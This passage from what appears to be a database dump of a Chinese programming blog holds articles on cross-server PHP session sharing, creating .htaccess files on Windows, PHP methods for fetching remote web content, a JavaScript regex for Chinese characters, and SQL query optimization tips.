/>\r\n好处是服务器的压力减小了，因为session数据不存在服务器磁盘上。根本就不会出现session读取不到的问题。</p>\r\n\r\n<p>带来的弊端是：<br />\r\n网络请求占用很多。每次请求时，客户端都要通过cookie发送session数据给服务器。<br />\r\n另外，浏览器对cookie的大小存在限制。每个浏览器限制是不同的。<br />\r\nFirefox和Safari允许cookie多达4097个字节，包括名（name）、值（value）和等号。<br />\r\nOpera允许cookie多达4096个字节，包括：名（name）、值（value）和等号。<br />\r\nInternet Explorer允许cookie多达4095个字节，包括：名（name）、值（value）和等号。<br />\r\n所以第一种方案不适合高访问量的情况下，因为高访问量的情况下，每次请求浏览器都要发送session数据给服务器。一般一个cookie大小2k的样子。<br />\r\n要占用很多带宽了(服务器购买带宽是一个很大费用)，成本增高。归纳为带宽性能，速度问题。<br />\r\n存储到cookie中去，第二方面是安全问题：把session数据放到客户端，一般session中存的都是重要性数据(帐号、昵称、用户id等)，会存在安全问题。<br />\r\n了解到，淘宝以前用过这种方式，把session数据存储到cookie中，根据cookie来识别用户。</p>\r\n\r\n<p>第二种思路：用一种算法(简单理解为规则)，什么机制下session是保存在哪台服务器下，那么读取的时候就按照这种规则去读取，就能定位到原来的服务器。叫做分发请求，分发到特定的服务器上去，我理解其原理是存session和读session数据保证都在一台服务器操作，就不会需要涉及到共享，具体实现方式是通过约定一种分发机制来实现。<br />\r\n也叫做sticky模式(粘性会话模式)，同一个用户的访问请求都被派送到同一个服务器上。<br />\r\n假设是同一个用户user1，每次访问都路由到同一台服务器上,这样即便是在负载均衡的情况下，也能保证每次访问都能读取到session，不需要做session数据共享了。<br />\r\n关键多台server的原因是为负载均衡而做的，那么就得把原来负载均衡的规则假设是&mdash;a，现在改为按照session来均衡分发请求的规则&mdash;b。<br />\r\n如果这台机子挂掉了，那么后续的请求按照session的规则还是会分发到这台服务器上去，但是现在不可用了。<br />\r\n本来负载均衡有一个目的就是：当其中一台机子不可用的时候，会自动分发到可用的机子上去(自动判断现在要请求的机子是否可用)<br />\r\n因为某种规则的session都是保存在一台服务器上，比如用户编号是1-200涉及到的session数据保存到a服务器上去。所以只要一台出问题，1-200的用户就无法实现登录了。后面就不可用了(可能想到1-200用户的session服务器用多台进行复制，这感觉很蹩脚，仍然需要用到复制的话，还不如用其他简便的方法)</p>\r\n\r\n<p>第三种思路：做一个中间层，专门来存储所有访问涉及到的session。也就是所有的session都存储在这里。<br />\r\n服务器端统一从这里读取session数据。<br />\r\n具体实现方式很多种。我的理解是，这里只是一种思想层面上的。我不知道淘宝的tbsession框架的具体实现。但是大致思想差不多，<br />\r\n由这个session框架来维护所有网站的session数据。我根据自己的理解，猜测淘宝的结构画图大致如下：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719135808330960.jpg\" style=\"height:499px; width:871px\" /></p>\r\n\r\n<p>使用这种中间层的思想来实现共享，具体的技术方案，我归纳为以下几种：</p>\r\n\r\n<p>1、 通过NFS文件共享的方式，多台php服务器共享保存session文件的磁盘。<br />\r\n通过nfs的方式，各个php服务器操作session数据的时候，是读取本地磁盘目录，但实际上是一个共享网络文件。各个php服务器实际上操作的都是同一个目录的文件。<br />\r\n具体的操作细节。到时候还需要详细写一下。我根据理解，画了下面的图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719135920607925.png\" style=\"height:465px; width:842px\" /></p>\r\n\r\n<p>2、保存在数据库中，这种方式的扩展性很强，可以随意增加WEB而不受影响。放在数据库里面安全方面好。</p>\r\n\r\n<p>其实我理解本质是：自己写程序(php,java都可以实现，反正是保存在数据库中)模拟实现session的机制。</p>\r\n\r\n<p>具体为，把以前存储在文件中的session数据存储到数据库中去，那么这样做，其实就不用到php内置的session机制了(像session_start()之类的函数都不需要去用了)。<br />\r\n写程序要模拟的是，从数据库拿session数据，约定什么情况下数据过期了然后自动清理，这里是指删除数据库中的行。保存在文件中的时候，php有垃圾回收机制会去自动清理过期的session文件。</p>\r\n\r\n<p>====================================弊端</p>\r\n\r\n<p>放在数据库里面，访问量小没有问题。大流量网站这么做，只会拖慢速度。因为得查询数据库，造成数据库压力大。<br />\r\n高并发访问的情况下,会出现很大的性能问题。<br />\r\n有些做法跟这种思想是类似的：比如ecshop、phpcms是把session数据都存储在数据库中去。服务端就是从数据库中拿session的数据。<br />\r\n放到数据库存储后，就可以实现：多台web服务器统一操作数据库，因为数据都在数据库，web服务器都能从数据库进行读取，那么session数据就能实现共享。<br />\r\n存储在数据库的做法，在线人数决定了其瓶颈，主要问题是影响性能。在线人数,因为登录的session数据存储在数据库中，只要是登录的用户就会涉及到频繁操作数据库。<br />\r\n我觉得小网站，同时1-2万个人在线情况下。应该没什么问题。<br />\r\n看网上丢出一个问题：对于大访问量的网站，数据库存储session方法可行性有待商榷。<br />\r\n我搜寻了一些资料，理解如下：<br />\r\n访问量大的话，一个用户访问了n多个页面，哪怕是刷新页面，都需要去数据库取session数据。数据库的承受压力，确实很恐怖。pv是多少，就要请求多少次数据库服务器。<br />\r\n访问每个页面都会去数据库查询是否登录，或者添加数据进数据库的sessions表</p>\r\n\r\n<p>保存在文件中的时候，则交给了操作系统去控制。一个用户怎么刷新页面，查看其他页面，都只需要读取单个session文件(sess_74dd7807n2mfml49a1i12hkc45)。<br />\r\n我觉得，ecshop,discuz之类的系统之所以把session存储在数据库中去，跟网站的应用级别有关。他们设计的系统本身就是给中小站长用的，这些中小站长一般由于规模小，经济成本考虑，使用的是虚拟主机之类的。不具备对服务器的完全控制权限，比如还要安个memcache之类的,修改php.ini之类的都需要自己拥有独立服务器才能操控的(vps也算,只是虚拟出来的硬件而已)。<br />\r\n其实真正要做到网站大了，系统承受不住了。也会自己有独立的技术人员可以进行二次开发。</p>\r\n\r\n<p>discuz这些做通用的软件要考虑思路有个特点：得考虑大部分用户的服务器环境。比如经常看到源代码里面要做php版本判断的代码，判断是5.0之前的要如何处理，以求尽量适应大部分环境。而我们公司自己运营的内部系统，环境我们完全可控。做这些确实是多余的工作量。<br />\r\n另外一个点是，这些通用软件不会为了高级用户的特殊需求，做一些改变，结果另外一部分用户就无法使用了。没法两全。所以我的理解是，他们一般不会随便去响应站长的需求，比如你明明是一个很大用户的站点，你用了我的系统，还要说数据量大了承受不住，表容易损坏。你都达到某种级别的应用了，还不自己进行开发。来这里抱怨。找我按照你们方式定制，愿意给钱就好。</p>\r\n\r\n<p>从这里我看到，不是说这些软件技术含量就多好，是多么成熟的解决方案。他们针对的用户群不同。<br />\r\n由于http是短连接，每次过程是：建立连接(握手)》》数据通信》》通信结束后结束连接。如果频繁的这样子连接后再断开，性能会非常差。<br />\r\nsession存储在数据库中，有多少pv，就要多少次这样的数据库连接操作(得去数据库拿session才能知道有没有登录，登录是否过时)。</p>\r\n\r\n<p>3、可以将session数据保存在memcached，redis之类内存数据库中，memcached是基于内存存储数据的，性能很高，用户并发量很大的时候尤其合适。<br />\r\n主要是利用内存的数据读取速度是很快的，与磁盘读取的速度不是一个数量级的。<br />\r\n使用内存存储：方便统计在线人数，内存的速度比磁盘访问快、内存数据库系统能够控制内存中的过期数据自动失效(刚好符合session过期需要)。<br />\r\n存储在redis比较理想的选择，存储在数据库中方便存储统计在线人数，那么存储在redis中也实现了这个要求。<br />\r\n也可以存储在memcache中。但redis支持的数据类型多。所以用它好点。</p>\r\n\r\n<p>关于使用技术工具复制session数据同步到多台服务器的方案权衡：</p>\r\n\r\n<p>这种方案是，使用一些文件同步工具(linux下的rsync)，当a服务器中的session数据有更改的时候，就会把这些更改也同步到b，c服务器上去。通过复制的方式，最终a，b，c各个服务器上都拷贝了一份session数据。</p>\r\n\r\n<p>这种方式的弊端是，速度慢。复制数据会出现延迟。比如第一秒访问是a服务器，修改了session数据，负载均衡，可能下一秒访问是b服务器，session数据如果没有被复制到b服务器，则是读取不到session数据的，出现时间上的延迟。这种复制数据要消耗很多网络带宽的。在实际中业界用得比较少。机器的数量越多，复制数据的性能损耗越大。不具备高度扩展性。<br />\r\n复制session的方式，无论是网络带宽成本还是硬件开销上都很大的。</p>\r\n\r\n<p>&nbsp;=================================结束</p>\r\n\r\n<p>我写这篇总结文章的目的，只是为了梳理知识，完善自己的知识库。不一定正确。其中有些方式我确实没试过，也没有100%搞清楚细节。所以不一定完全正确。<br />\r\n有不当之处，期待后续完善，欢迎指正。</p>\r\n\r\n<p>转自:http://www.cnblogs.com/wangtao_20/archive/2013/10/29/3395518.html</p>\r\n',0,1437285932,0,0),(24,23,'Windows下自由创建.htaccess文件的N种方法','<p>.htaccess是apache的访问控制文件，apache中httpd.conf的选项配合此文件，完美实现了目录、站点的访问控制，当然最多的还是rewrite功能，即URL重写，PHP中实现伪静态的一个重要途径，也是被公认为SEO中搜索引擎友好的极为有效的一个手段。<br />\r\n尽管前些天的黑屏风波闹的沸沸扬扬，但依本人拙见，windows用户并无任何减少。现在的一个实际问题就是windows不允许重命名时.的前面没有字符，它认为这样的文件名是不合法的。这就造成我们无法通过重命名&rdquo;新建文本文档.txt&rdquo;为&rdquo;.htaccess&rdquo;来创建此访问控制文件，但是，事情总有解决的办法。且看下面的几个方法：</p>\r\n\r\n<p>1、使用DOS命令，在DOS下有三种方法可供选择：</p>\r\n\r\n<p>使用屏幕编辑命令copy con .htaccess后回车，输入内容，最后按下ctrl+z结束编辑，就成功生成了.htaccess；<br />\r\n使用重命名命令ren 1.txt .htaccess ，这是最常规的方法了，在windows窗口下不能执行的命令，在cmd下却如履平地；<br />\r\n使用重定向命令 echo. &gt;.htaccess，这里将一个回车符输入到.htaccess，同样能创建成功；<br />\r\n三种方法一并截图如下：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719143922483065.jpg\" style=\"height:217px; width:331px\" /></p>\r\n\r\n<p>2、用winrar的文件管理器，先新建一文本文档，然后打开winrar主界面，定位到该文件，可以直接重命名，这是我在解压一国外开源项目时，其自带的.htaccess居然能正确解压出来时，所得到的启发，当然你使用7zip之类的管理器也是可以的，OK，看截图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719143951821911.jpg\" style=\"height:174px; width:367px\" /></p>\r\n\r\n<p>3、直接通过文本编辑工具保存，例如记事本，ultraEdit等等，不过保存的时候选择所有文件就可以了，这实在是一个欠揍的方法，不过肯定不是我欠揍，欠揍的是微软，华丽截图来一张：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719144018414895.jpg\" style=\"height:126px; width:454px\" /></p>\r\n\r\n<p>4、使用php中的文件创建方法，fopen，file_put_contents文件名直接取.htaccess就成。</p>\r\n\r\n<p>我目前也就发现（发明？）了这么几个方法，不过应该够用吧？</p>\r\n',0,1437288044,0,0),(25,10,'PHP获取远程站点响应内容的方法总结','<p>方法1: 用file_get_contents 以get方式获取内容<br />\r\n&lt;?php<br />\r\n$url=&#39;http://www.domain.com/?para=123&#39;;<br />\r\n$html = file_get_contents($url);<br />\r\necho $html;<br />\r\n?&gt;</p>\r\n\r\n<p>方法2：用file_get_contents函数,以post方式获取url<br />\r\n&lt;?php<br />\r\n$url = &#39;http://www.domain.com/test.php?id=123&#39;;<br />\r\n$data = array (&#39;foo&#39; =&gt; &#39;bar&#39;);<br />\r\n$data = http_build_query($data);</p>\r\n\r\n<p>$opts = array (<br />\r\n&nbsp;&nbsp; &nbsp;&#39;http&#39; =&gt; array (<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#39;method&#39; =&gt; &#39;POST&#39;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#39;header&#39;=&gt; &quot;Content-type: application/x-www-form-urlencoded\\r\\nContent-Length: &quot; . strlen($data) . &quot;\\r\\n&quot;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#39;content&#39; =&gt; $data<br />\r\n&nbsp;&nbsp; &nbsp;)<br />\r\n);<br />\r\n$ctx = stream_context_create($opts);<br />\r\n$html = @file_get_contents($url, &#39;&#39;, $ctx);</p>\r\n\r\n<p>如果需要再传递cookie数据,则把<br />\r\n&#39;header&#39;=&gt; &quot;Content-type: application/x-www-form-urlencoded\\r\\nContent-Length: &quot; . strlen($data) . &quot;\\r\\n&quot;,<br />\r\n修改为<br />\r\n&#39;header&#39;=&gt; &quot;Content-type: application/x-www-form-urlencoded\\r\\nContent-Length: &quot; . strlen($data) . &quot;\\r\\ncookie:cookie1=c1;cookie2=c2\\r\\n&quot;;<br />\r\n即可</p>\r\n\r\n<p>方法3: 用fopen打开url, 以get方式获取内容<br />\r\n&lt;?php<br />\r\n$fp = fopen($url, &#39;r&#39;);<br />\r\n$header = stream_get_meta_data($fp);//获取报头信息<br />\r\nwhile(!feof($fp)) {<br />\r\n&nbsp;&nbsp; &nbsp;$result .= fgets($fp, 1024);<br />\r\n}<br />\r\necho &quot;url header: {$header} &lt;br&gt;&quot;:<br />\r\necho &quot;url body: $result&quot;;<br />\r\nfclose($fp);<br />\r\n?&gt;</p>\r\n\r\n<p>方法4: 用fopen打开url, 以post方式获取内容<br />\r\n&lt;?php<br />\r\n$data = array (&#39;foo2&#39; =&gt; &#39;bar2&#39;,&#39;foo3&#39;=&gt;&#39;bar3&#39;);<br />\r\n$data = http_build_query($data);</p>\r\n\r\n<p>$opts = array (<br />\r\n&nbsp;&nbsp; &nbsp;&#39;http&#39; =&gt; array (<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#39;method&#39; =&gt; &#39;POST&#39;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#39;header&#39;=&gt; &quot;Content-type: application/x-www-form-urlencoded\\r\\nCookie:cook1=c3;cook2=c4\\r\\nContent-Length: &quot;.strlen($data).&quot;\\r\\n&quot;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#39;content&#39; =&gt; $data<br />\r\n&nbsp;&nbsp; &nbsp;)<br />\r\n);</p>\r\n\r\n<p>$context = stream_context_create($opts);<br />\r\n$html = fopen(&#39;http://www.test.com/zzzz.php?id=i3&amp;id2=i4&#39;, &#39;rb&#39;, false, $context);<br />\r\n$w=fread($html,1024);<br />\r\necho $w;<br />\r\n?&gt;</p>\r\n\r\n<p>方法5：用fsockopen函数打开url，以get方式获取完整的数据，包括header和body<br />\r\n&lt;?php<br />\r\nfunction get_url($url, $cookie=false)<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;$url = parse_url($url);<br />\r\n&nbsp;&nbsp; &nbsp;$query = $url[path].&quot;?&quot;.$url[query];<br />\r\n&nbsp;&nbsp; &nbsp;echo &quot;Query:&quot;.$query;<br />\r\n&nbsp;&nbsp; &nbsp;$fp = fsockopen( $url[host], $url[port]?$url[port]:80 , $errno, $errstr, 30);<br />\r\n&nbsp;&nbsp; &nbsp;if(!$fp)<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return false;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;else<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$request = &quot;GET $query HTTP/1.1\\r\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$request .= &quot;Host: $url[host]\\r\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$request .= &quot;Connection: Close\\r\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if($cookie)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$request.=&quot;Cookie: $cookie\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$request.=&quot;\\r\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;fwrite($fp, $request);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while(!feof($fp))<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$result .= @fgets($fp, 1024);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;fclose($fp);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return $result;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}<br />\r\n//获取url的html部分，去掉header<br />\r\nfunction GetUrlHTML($url,$cookie=false)<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;$rowdata = get_url($url,$cookie);<br />\r\n&nbsp;&nbsp; &nbsp;if($rowdata)<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$body= stristr($rowdata,&quot;\\r\\n\\r\\n&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$body=substr($body,4,strlen($body));<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return $body;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;return false;<br />\r\n}<br />\r\n?&gt;</p>\r\n\r\n<p>方法6：用fsockopen函数打开url，以POST方式获取完整的数据，包括header和body<br />\r\n&lt;?php<br />\r\nfunction HTTP_Post($URL,$data,$cookie, $referrer=&quot;&quot;)<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;// parsing the given URL<br />\r\n&nbsp;&nbsp; &nbsp;$URL_Info=parse_url($URL);</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;// Building referrer<br />\r\n&nbsp;&nbsp; &nbsp;if($referrer==&quot;&quot;) // if not given use this script as referrer<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$referrer=&quot;111&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;// making string from $data<br />\r\n&nbsp;&nbsp; &nbsp;foreach($data as $key=&gt;$value)<br />\r\n&nbsp;&nbsp; &nbsp;$values[]=&quot;$key=&quot;.urlencode($value);<br />\r\n&nbsp;&nbsp; &nbsp;$data_string=implode(&quot;&amp;&quot;,$values);</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;// Find out which port is needed - if not given use standard (=80)<br />\r\n&nbsp;&nbsp; &nbsp;if(!isset($URL_Info[&quot;port&quot;]))<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$URL_Info[&quot;port&quot;]=80;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;// building POST-request:<br />\r\n&nbsp;&nbsp; &nbsp;$request.=&quot;POST &quot;.$URL_Info[&quot;path&quot;].&quot; HTTP/1.1\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;$request.=&quot;Host: &quot;.$URL_Info[&quot;host&quot;].&quot;\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;$request.=&quot;Referer: $referer\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;$request.=&quot;Content-type: application/x-www-form-urlencoded\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;$request.=&quot;Content-length: &quot;.strlen($data_string).&quot;\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;$request.=&quot;Connection: close\\n&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;$request.=&quot;Cookie: $cookie\\n&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;$request.=&quot;\\n&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;$request.=$data_string.&quot;\\n&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;$fp = fsockopen($URL_Info[&quot;host&quot;], $URL_Info[&quot;port&quot;]);<br />\r\n&nbsp;&nbsp; &nbsp;fputs($fp, $request);<br />\r\n&nbsp;&nbsp; &nbsp;while(!feof($fp))<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$result .= fgets($fp, 1024);<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;fclose($fp);</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;return $result;<br />\r\n}</p>\r\n\r\n<p>?&gt;</p>\r\n\r\n<p>方法7:使用curl库，使用curl库之前，可能需要查看一下php.ini是否已经打开了curl扩展<br />\r\n&lt;?php<br />\r\n$ch = curl_init();<br />\r\n$timeout = 5;<br />\r\ncurl_setopt ($ch, CURLOPT_URL, &#39;http://www.domain.com/&#39;);<br />\r\ncurl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);<br />\r\ncurl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);<br />\r\n$file_contents = curl_exec($ch);<br />\r\ncurl_close($ch);</p>\r\n\r\n<p>echo $file_contents;<br />\r\n?&gt;</p>\r\n',0,1437290913,0,0),(26,1,'js正则匹配所有汉字','<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />\r\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br />\r\n&lt;title&gt;无标题文档&lt;/title&gt;<br />\r\n&lt;script&gt;<br />\r\nfunction aaa(str)<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;var reg = /^[\\u4e00-\\u9fa5]+$/;<br />\r\n&nbsp;&nbsp; &nbsp;if(reg.test(str)){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;alert(&#39;汉字的干活&#39;);<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;else<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;alert(&#39;非全部汉字&#39;);<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}<br />\r\n&lt;/script&gt;<br />\r\n&lt;/head&gt;</p>\r\n\r\n<p>&lt;body&gt;<br />\r\n&lt;input type=&quot;button&quot; onclick=&quot;aaa(&#39;去我饿人&#39;)&quot; value=&quot;test1&quot; /&gt;<br />\r\n&lt;input type=&quot;button&quot; onclick=&quot;aaa(&#39;fnjdsfsjfsfk&#39;)&quot; value=&quot;test2&quot; /&gt;<br />\r\n&lt;input type=&quot;button&quot; onclick=&quot;aaa(&#39;去我dfhsdf饿人&#39;)&quot; value=&quot;test3&quot; /&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n',0,1437291822,0,0),(27,24,'sql 百万级数据库优化方案','<p>1.对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。</p>\r\n\r\n<p>2.应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如：<br />\r\nselect id from t where num is null<br />\r\n可以在num上设置默认值0，确保表中num列没有null值，然后这样查询：<br />\r\nselect id from t where num=0</p>\r\n\r\n<p>3.应尽量避免在 where 子句中使用!=或&lt;&gt;操作符，否则将引擎放弃使用索引而进行全表扫描。</p>\r\n\r\n<p>4.应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如：<br />\r\nselect id from t where num=10 or num=20<br />\r\n可以这样查询：<br />\r\nselect id from t where num=10<br />\r\nunion all<br />\r\nselect id from t where num=20</p>\r\n\r\n<p>5.in 和 not in 也要慎用，否则会导致全表扫描，如：<br />\r\nselect id from t where num in(1,2,3)<br />\r\n对于连续的数值，能用 between 就不要用 in 了：<br />\r\nselect id from t where num between 1 and 3</p>\r\n\r\n<p>6.下面的查询也将导致全表扫描：<br />\r\nselect id from t where name like &lsquo;%abc%&rsquo;<br />\r\n若要提高效率，可以考虑全文检索。</p>\r\n\r\n<p>7.如果在 where 子句中使用参数，也会导致全表扫描。因为SQL只有在运行时才会解析局部变量，但优化程序不能将访问计划的选择推迟到运行时；它必须在编译时进行选择。然而，如果在编译时建立访问计划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描：<br />\r\nselect id from t where num=@num<br />\r\n可以改为强制查询使用索引：<br />\r\nselect id from t with(index(索引名)) where num=@num</p>\r\n\r\n<p>8.应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如：<br />\r\nselect id from t where num/2=100<br />\r\n应改为:<br />\r\nselect id from t where num=100*2</p>\r\n\r\n<p>9.应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：<br />\r\nselect id from t where substring(name,1,3)=&rsquo;abc&rsquo;&ndash;name以abc开头的id<br />\r\nselect id from t where datediff(day,createdate,&rsquo;2005-11-30&prime;)=0&ndash;&lsquo;2005-11-30&rsquo;生成的id<br />\r\n应改为:<br />\r\nselect id from t where name like &lsquo;abc%&rsquo;<br />\r\nselect id from t where createdate&gt;=&rsquo;2005-11-30&prime; and createdate&lt;&rsquo;2005-12-1&prime;</p>\r\n\r\n<p>10.不要在 where 子句中的&ldquo;=&rdquo;左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。</p>\r\n\r\n<p>11.在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会 被使用，并且应尽可能的让字段顺序与索引顺序相一致。</p>\r\n\r\n<p>12.不要写一些没有意义的查询，如需要生成一个空表结构：<br />\r\nselect col1,col2 into #t from t where 1=0<br />\r\n这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：<br />\r\ncreate table #t(&hellip;)</p>\r\n\r\n<p>13.很多时候用 exists 代替 in 是一个好的选择：<br />\r\nselect num from a where num in(select num from b)<br />\r\n用下面的语句替换：<br />\r\nselect num from a where exists(select 1 from b where num=a.num)</p>\r\n\r\n<p>14.并不是所有索引对查询都有效，SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引，如一表中有 字段sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。</p>\r\n\r\n<p>15.索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有 必要。</p>\r\n\r\n<p>16.应尽可能的避免更新 clustered 索引数据列，因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。</p>\r\n\r\n<p>17.尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连 接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。</p>\r\n\r\n<p>18.尽可能的使用 varchar/nvarchar 代替 char/nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。</p>\r\n\r\n<p>19.任何地方都不要使用 select * from t ，用具体的字段列表代替&ldquo;*&rdquo;，不要返回用不到的任何字段。</p>\r\n\r\n<p>20.尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限（只有主键索引）。</p>\r\n\r\n<p>21.避免频繁创建和删除临时表，以减少系统表资源的消耗。</p>\r\n\r\n<p>22.临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用表中的某个数据集时。但是，对于一次性事件， 最好使用导出表。</p>\r\n\r\n<p>23.在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log ，以提高速度；如果数据量不大，为了缓和系统表的资源，应先create table，然后insert。</p>\r\n\r\n<p>24.如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除，先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。</p>\r\n\r\n<p>25.尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。</p>\r\n\r\n<p>26.使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更有效。</p>\r\n\r\n<p>27.与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括&ldquo;合计&rdquo;的例程通常要比使用游标执行的速度快。如果开发时 间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。</p>\r\n\r\n<p>28.在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ，在结束时设置 SET NOCOUNT OFF 。无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 